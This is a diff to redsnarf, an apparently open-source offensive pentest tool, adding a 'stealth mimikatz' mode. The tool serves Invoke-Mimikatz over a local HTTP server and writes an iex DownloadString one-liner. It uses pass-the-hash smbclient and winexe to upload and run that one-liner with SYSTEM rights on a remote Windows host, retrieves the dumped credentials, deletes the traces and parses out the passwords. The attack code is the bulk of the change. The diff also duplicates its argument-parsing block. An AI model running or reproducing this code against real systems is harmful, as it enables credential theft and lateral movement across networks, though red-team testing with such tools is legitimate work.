@@ -3,7 +3,7 @@
 # https://github.com/nccgroup/redsnarf
 # Released under Apache V2 see LICENCE for more information
 
-import os, argparse, signal, sys, re, binascii, subprocess, string
+import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
 
 try:
 	from IPy import IP
@@ -28,6 +28,10 @@ from base64 import b64decode
 from socket import *
 from threading import Thread
 from impacket.smbconnection import *
+
+import socket
+import fcntl
+import struct
 
 yesanswers = ["yes", "y", "Y", "Yes", "YES"]
 noanswers = ["no", "NO", "n", "N"]
@@ -95,6 +99,14 @@ def WriteLAT():
 		print colored("[+]Written to /tmp/lat.bat ",'yellow')
 	except:
 		print colored("[-]Something went wrong...",'red')
+
+def get_ip_address(ifname):
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	return socket.inet_ntoa(fcntl.ioctl(
+		s.fileno(),
+		0x8915,  # SIOCGIFADDR
+		struct.pack('256s', ifname[:15])
+	)[20:24])
 
 
 def datadump(user, passw, host, path, os_version):
@@ -242,6 +254,7 @@ def datadump(user, passw, host, path, os_version):
 							os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
 							print colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump.txt",'yellow')
 							print colored("[+]Basic parsed output:",'green')
+							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
 							os.system("cat "+outputpath+host+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 					else:
 						print colored("[-]mimi_creddump.txt file not found",'red')       
@@ -255,6 +268,58 @@ def datadump(user, passw, host, path, os_version):
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+xcommand+"\" 2>/dev/null")
 				except:
 					print colored("[-]Something went wrong ...",'red')
+
+			
+			if stealth_mimi in yesanswers:
+				try:
+					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
+					if not os.path.isfile('./Invoke-Mimikatz.ps1'):
+						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
+						exit(1)
+					print colored("[+]Looks good",'green')	
+					PORT = 1234
+										
+					my_ip=get_ip_address('eth0')
+					print colored("[+]Attempting to Run Safe Mimikatz",'green')
+					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+					httpd = SocketServer.TCPServer(("",PORT), Handler)
+					print colored("[+]Starting web server on port:"+str(PORT)+"",'green')
+					server_process = multiprocessing.Process(target=httpd.serve_forever)
+					server_process.daemon = True
+					server_process.start()	
+					
+					print colored("[+]Creating powershell script in /tmp",'green')
+					fout=open('/tmp/stealth_mimi.ps1','w')
+
+					line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds > c:\\creds.txt"
+					fout.write(line)
+					fout.close()
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put stealth_mimi.ps1\' 2>/dev/null")
+					
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\stealth_mimi.ps1 -Verb RunAs\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt c:\\stealth_mimi.ps1\" 2>/dev/null")
+					if os.path.isfile(outputpath+host+"/creds.txt"):
+						print colored("[+]creds.txt file found",'green')
+						if not os.path.isfile('/usr/bin/iconv'):
+							print colored("[-]Cannot find iconv",'red')
+							exit(1)
+						else:
+							print colored("[+]Found iconv",'green')
+							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/creds.txt > "+outputpath+host+"/creds1.txt")
+							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
+							print colored("[+]Creds:",'green')
+							os.system("cat "+outputpath+host+"/creds1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
+							print colored("[+]Mimikatz output stored in "+outputpath+host+"/creds1.txt",'yellow')
+							print colored("[+]Clearing up.....","yellow")
+							os.system("rm /tmp/stealth_mimi.ps1")
+							print colored("[+]Stoping web server",'green')
+							server_process.terminate()
+					else:
+						print colored("[-]creds1.txt file not found",'red')
+
+				except OSError:
+					print colored("[-]Something went wrong here...",'red')
 
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
@@ -436,6 +501,17 @@ p.add_argument("-R", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> 
 p.add_argument("-r", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery NLA Status")
 p.add_argument("-t", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
 p.add_argument("-W", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
+p.add_argument("-s", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
+
+
+args = p.parse_args()
+
+user = args.username
+passw = args.password
+files = ['sam', 'system', 'security']
+progs = ['cachedump','lsadump']
+
+creddump7path=args.credpath
 
 
 args = p.parse_args()
@@ -467,7 +543,7 @@ edq_rdp=args.edq_rdp
 edq_nla=args.edq_nla
 edq_trdp=args.edq_trdp
 edq_wdigest=args.edq_wdigest
-
+stealth_mimi=args.stealth_mimi
 
 if lat in yesanswers:
 	WriteLAT()
